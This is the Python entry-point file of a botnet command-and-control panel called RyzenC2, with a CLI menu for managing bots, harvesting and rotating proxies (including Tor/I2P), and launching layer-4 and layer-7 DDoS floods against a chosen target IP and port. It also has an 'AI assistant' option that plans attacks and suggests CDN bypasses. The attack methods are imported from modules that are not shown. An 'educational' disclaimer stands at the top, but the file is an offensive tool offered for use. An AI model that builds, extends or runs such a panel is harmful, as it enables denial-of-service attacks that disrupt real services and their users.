#!/usr/bin/env python3
"""
RyzenC2 PROMAX v8.0 ULTIMATE — app.py (main entry)
CLI Panel + optional API server
File-based JSON | Kali Linux Ready
Educational / Authorized Testing Only
"""
import os, sys, time
from pathlib import Path

ROOT = Path(__file__).parent.resolve()
sys.path.insert(0, str(ROOT))

import config as cfg
from core.database import Database
from core.cache import Cache
from core.auth import AuthManager
from core.bot_manager import BotManager
from core.proxy_manager import ProxyManager
from core.attack_scheduler import AttackScheduler
from core.logger import Logger
from core.ai_engine import AIEngine
from core.analytics_engine import AnalyticsEngine
from core.security import SecurityManager
from core.plugin_manager import PluginManager
from core.event_bus import EventBus
from core.backup_manager import BackupManager
from core.health_check import HealthCheck
from core.methods import ALL_METHODS, L4_METHODS, L7_METHODS
from core.utils import format_bytes, format_number, format_datetime
from api.server import start_api_server
from core.service_mesh import MESH
from core.message_queue import MQ
from core.event_bus import BUS

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
    class Style:
        BRIGHT=RESET_ALL=""

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}RYZENC2{Fore.CYAN}  VIP PROMAX v8.0 ULTIMATE                                          ║
║  L4 & L7 | 240+ Methods | Proxy Rotation | AI | File-based JSON               ║
║  OPSEC Hardened | Kali Linux 2026 | Authorized Use Only                       ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def clear(): os.system("cls" if os.name=="nt" else "clear")
def pause(): input(f"\n{Fore.YELLOW}Enter...{Style.RESET_ALL}")

def menu():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║              {Fore.WHITE}MAIN MENU — RyzenC2 PROMAX v8.0{Fore.CYAN}                     ║
╠══════════════════════════════════════════════════════════════════╣
║  {Fore.GREEN}[1]{Fore.WHITE} Dashboard          {Fore.GREEN}[7]{Fore.WHITE} Methods (L4/L7)                    {Fore.CYAN}║
║  {Fore.GREEN}[2]{Fore.WHITE} Bot Management     {Fore.GREEN}[8]{Fore.WHITE} AI Assistant                       {Fore.CYAN}║
║  {Fore.GREEN}[3]{Fore.WHITE} Proxy Management   {Fore.GREEN}[9]{Fore.WHITE} System / Health                     {Fore.CYAN}║
║  {Fore.GREEN}[4]{Fore.WHITE} Launch Attack      {Fore.GREEN}[10]{Fore.WHITE} Logs                               {Fore.CYAN}║
║  {Fore.GREEN}[5]{Fore.WHITE} Active Attacks     {Fore.GREEN}[11]{Fore.WHITE} API Server                         {Fore.CYAN}║
║  {Fore.GREEN}[6]{Fore.WHITE} Attack History     {Fore.GREEN}[12]{Fore.WHITE} Backup                             {Fore.CYAN}║
║  {Fore.GREEN}[0]{Fore.WHITE} Exit                                                         {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

def main():
    clear(); print(BANNER)
    print(f"{Fore.YELLOW}[*] Init RyzenC2...{Style.RESET_ALL}")
    Path(cfg.DATA_DIR).mkdir(parents=True, exist_ok=True)
    Path(cfg.LOG_DIR).mkdir(parents=True, exist_ok=True)
    Path(cfg.DATA_DIR,"cache").mkdir(parents=True, exist_ok=True)

    db = Database(cfg.DATA_DIR)
    cache = Cache({"l2_path": str(Path(cfg.DATA_DIR)/"cache")})
    logger = Logger({"log_path": str(Path(cfg.LOG_DIR)/"panel.log"), "level": cfg.LOG_LEVEL})
    auth = AuthManager(db, cfg.ADMIN_USER, cfg.ADMIN_PASS)
    bot_mgr = BotManager(db, cache, cfg.BOT_TIMEOUT)
    proxy_mgr = ProxyManager(db, cache, config_path=str(ROOT/"config.json"))
    proxy_mgr.load_proxies()
    attack_mgr = AttackScheduler(db, cache, bot_mgr, proxy_mgr)
    ai = AIEngine()
    analytics = AnalyticsEngine()
    security = SecurityManager()
    plugins = PluginManager("plugins")
    events = EventBus()
    backup = BackupManager(cfg.DATA_DIR, str(Path(cfg.DATA_DIR)/"backup"))
    health = HealthCheck(cfg.DATA_DIR, cfg.LOG_DIR)
    cache.warmup()
    plugins.discover()
    MESH.register('api','127.0.0.1',cfg.API_PORT,{'role':'api'})
    BUS.emit('panel_start', {'version': cfg.PANEL_VERSION})
    logger.info("Panel started", version=cfg.PANEL_VERSION)
    api_srv = None

    print(f"\n{Fore.YELLOW}[*] Login{Style.RESET_ALL}")
    for _ in range(3):
        u = input(f"{Fore.CYAN}User: {Style.RESET_ALL}").strip()
        p = input(f"{Fore.CYAN}Pass: {Style.RESET_ALL}").strip()
        s = auth.login(u, p)
        if s:
            logger.info("Login ok", user=u)
            print(f"{Fore.GREEN}[+] OK — {s['role']}{Style.RESET_ALL}"); time.sleep(0.3); break
        print(f"{Fore.RED}[!] Fail{Style.RESET_ALL}")
    else:
        sys.exit(1)

    while True:
        clear(); print(BANNER); menu()
        c = input(f"{Fore.YELLOW}>> {Style.RESET_ALL}").strip()

        if c=="1":
            bs,ps,as_ = bot_mgr.get_stats(), proxy_mgr.get_stats(), attack_mgr.get_stats()
            print(f"\nBots online {bs['online']}/{bs['total']} | Proxies alive {ps['alive']}/{ps['total']}")
            print(f"Attacks running {as_['running']} | Health {health.check()['status']}")
            pause()
        elif c=="2":
            print("[1] list [2] online [3] simulate [4] cleanup")
            x=input(">> ").strip()
            if x=="1":
                for b in bot_mgr.get_all()[:40]:
                    print(f"  {b.get('uuid','?')[:12]} {b.get('ip')} {b.get('os')} {b.get('status')}")
            elif x=="2":
                print(f"Online: {len(bot_mgr.get_online())}")
            elif x=="3":
                n=int(input("count [50]: ") or "50"); bot_mgr.simulate(n); print(f"+{n}")
            elif x=="4":
                print(f"cleaned {bot_mgr.cleanup()}")
            pause()
        elif c=="3":
            print("[1] list [2] simulate [3] best [4] stats")
            print("[5] scrape [6] check-all [7] remove-dead [8] providers")
            print("[9] load paid (Bright/Oxylabs) [10] load Tor/I2P [11] geo enrich [12] provider status")
            x=input(">> ").strip()
            if x=="1":
                for p in proxy_mgr.get_all_proxies()[:30]:
                    print(f"  {p.get('protocol')} {p.get('address')}:{p.get('port')} score={p.get('score')} alive={p.get('alive')}")
            elif x=="2":
                n=int(input("count [100]: ") or "100"); proxy_mgr.simulate(n); print(f"+{n}")
            elif x=="3":
                for p in proxy_mgr.get_best_proxies(10): print(f"  {p.get('score')} {p.get('address')}")
            elif x=="4": print(proxy_mgr.get_stats())
            elif x=="5":
                print("[*] Scraping all providers (parallel)...")
                n=proxy_mgr.download_from_config(); proxy_mgr.save_proxies()
                print(f"[+] Scraped unique proxies: {n}"); print(proxy_mgr.get_stats())
            elif x=="6":
                print("[*] Checking proxies...")
                print(proxy_mgr.check_proxies())
            elif x=="7":
                print(f"[+] Removed dead: {proxy_mgr.remove_dead()}")
            elif x=="8":
                for i,pr in enumerate(proxy_mgr.get_providers()[:20],1):
                    print(f"  {i}. type={pr.get('type')} {pr.get('url')[:70]}")
                print(f"  ... total providers: {len(proxy_mgr.get_providers())}")
            elif x=="9":
                n=proxy_mgr.load_paid_providers(); proxy_mgr.save_proxies(); print(f"paid loaded {n}")
            elif x=="10":
                n=proxy_mgr.load_tor_i2p(); proxy_mgr.save_proxies(); print(f"tor/i2p {n}")
            elif x=="11":
                print(f"geo annotated {proxy_mgr.enrich_geo_maxmind()}")
            elif x=="12":
                import json; print(json.dumps(proxy_mgr.providers_status(), indent=2))
            pause()
        elif c=="4":
            method=input("Method: ").strip().upper().replace("_","-")
            if method=="LIST":
                print("L4:", ", ".join(L4_METHODS[:15]), "..."); print("L7:", ", ".join(L7_METHODS[:15]), "..."); pause(); continue
            target=input("Target: ").strip()
            port=int(input("Port [80]: ") or "80")
            dur=int(input("Duration [60]: ") or "60")
            thr=int(input("Threads [100]: ") or "100")
            if input("Type YES: ").strip()!="YES": print("cancel"); pause(); continue
            a=attack_mgr.create_attack({"method":method,"target_ip":target,"target_port":port,"duration":dur,"threads":thr})
            attack_mgr.start_attack(a["id"])
            analytics.record_event("attack_start",{"id":a["id"]})
            print(f"{Fore.GREEN}[+] Attack {a['id']}{Style.RESET_ALL}"); pause()
        elif c=="5":
            for a in attack_mgr.get_running_attacks():
                print(f"  ID={a['id']} {a.get('method')} -> {a.get('target_ip')}:{a.get('target_port')} PPS={a.get('pps',0):,}")
            sid=input("Stop ID (enter skip): ").strip()
            if sid.isdigit(): attack_mgr.stop_attack(int(sid)); print("stop sent")
            pause()
        elif c=="6":
            for a in attack_mgr.get_completed_attacks()[-20:]:
                print(f"  [{format_datetime(a.get('started_at') or 0)}] {a.get('method')} {a.get('target_ip')} ({a.get('status')})")
            pause()
        elif c=="7":
            print(f"L4 ({len(L4_METHODS)}):", ", ".join(L4_METHODS[:20]), "...")
            print(f"L7 ({len(L7_METHODS)}):", ", ".join(L7_METHODS[:20]), "...")
            print(f"Total: {len(ALL_METHODS)}"); pause()
        elif c=="8":
            print("[1] analyze [2] plan [3] bypass [4] chat")
            x=input(">> ").strip()
            if x=="1":
                t=input("target: ").strip(); print(ai.analyze(t))
            elif x=="2":
                t=input("target: ").strip(); print(ai.plan(t))
            elif x=="3":
                t=input("cdn type: ").strip(); print(ai.bypass({"type":t}))
            elif x=="4":
                print(ai.chat(input("msg: ").strip()))
            pause()
        elif c=="9":
            print("Health:", health.check())
            print("Bots:", bot_mgr.get_stats())
            print("Proxies:", proxy_mgr.get_stats())
            print("Attacks:", attack_mgr.get_stats())
            print("Cache:", cache.get_stats())
            print("Plugins:", plugins.list_plugins())
            print("Analytics:", analytics.get_summary())
            pause()
        elif c=="10":
            for line in logger.get_logs(40): print(line)
            pause()
        elif c=="11":
            if api_srv is None:
                api_srv = start_api_server(host=cfg.HOST, port=cfg.API_PORT,
                    bot_mgr=bot_mgr, proxy_mgr=proxy_mgr, attack_mgr=attack_mgr,
                    auth_mgr=auth, ai_engine=ai, analytics=analytics, health=health,
                    logger=logger, api_key=cfg.API_KEY)
                print(f"{Fore.GREEN}[+] API {cfg.HOST}:{cfg.API_PORT}  X-API-Key: {cfg.API_KEY}{Style.RESET_ALL}")
            else:
                print("API already running")
            pause()
        elif c=="12":
            path = backup.backup()
            print(f"{Fore.GREEN}[+] Backup {path}{Style.RESET_ALL}")
            pause()
        elif c=="0":
            attack_mgr.stop_all(); logger.info("Shutdown")
            print(f"{Fore.CYAN}[*] Bye{Style.RESET_ALL}"); break
        else:
            time.sleep(0.4)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted{Style.RESET_ALL}"); sys.exit(0)
